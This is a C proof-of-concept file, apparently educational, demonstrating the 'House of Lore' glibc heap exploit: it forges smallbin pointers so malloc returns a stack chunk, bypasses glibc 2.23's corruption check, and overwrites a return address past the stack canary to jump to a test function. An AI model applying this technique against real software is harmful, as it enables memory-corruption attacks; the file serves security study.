/*
Advanced exploitation of the House of Lore - Malloc Maleficarum.
This PoC take care also of the glibc hardening of smallbin corruption.

[ ... ]

else
    {
      bck = victim->bk;
    if (__glibc_unlikely (bck->fd != victim)){

                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                }

       set_inuse_bit_at_offset (victim, nb);
       bin->bk = bck;
       bck->fd = bin;

       [ ... ]

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void jackpot(){ puts("Nice jump d00d"); exit(0); }

int main(int argc, char * argv[]){


  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[3] = {0};

  printf("\nWelcome to the House of Lore\n");
  printf("This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
  printf("This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n");

  printf("Allocating the victim chunk\n");
  intptr_t *victim = malloc(100);
  printf("Allocated the first small chunk on the heap at %p\n", victim);

  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
  intptr_t *victim_chunk = victim-2;

  printf("stack_buffer_1 at %p\n", (void*)stack_buffer_1);
  printf("stack_buffer_2 at %p\n", (void*)stack_buffer_2);

  printf("Create a fake chunk on the stack");
  printf("Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
         "in second to the last malloc, which putting stack address on smallbin list\n");
  stack_buffer_1[0] = 0;
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;

  printf("Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "
         "chunk on stack");
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
  
  printf("Allocating another large chunk in order to avoid consolidating the top chunk with"
         "the small one during the free()\n");
  void *p5 = malloc(1000);
  printf("Allocated the large chunk on the heap at %p\n", p5);


  printf("Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free((void*)victim);

  printf("\nIn the unsorted bin the victim's fwd and bk pointers are nil\n");
  printf("victim->fwd: %p\n", (void *)victim[0]);
  printf("victim->bk: %p\n\n", (void *)victim[1]);

  printf("Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
  printf("This means that the chunk %p will be inserted in front of the SmallBin\n", victim);

  void *p2 = malloc(1200);
  printf("The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);

  printf("The victim chunk has been sorted and its fwd and bk pointers updated\n");
  printf("victim->fwd: %p\n", (void *)victim[0]);
  printf("victim->bk: %p\n\n", (void *)victim[1]);

  //------------VULNERABILITY-----------

  printf("Now emulating a vulnerability that can overwrite the victim->bk pointer\n");

  victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack

  //------------------------------------

  printf("Now allocating a chunk with size equal to the first one freed\n");
  printf("This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");

  void *p3 = malloc(100);


  printf("This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
  char *p4 = malloc(100);
  printf("p4 = malloc(100)\n");

  printf("\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
         stack_buffer_2[2]);

  printf("\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
  memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
}
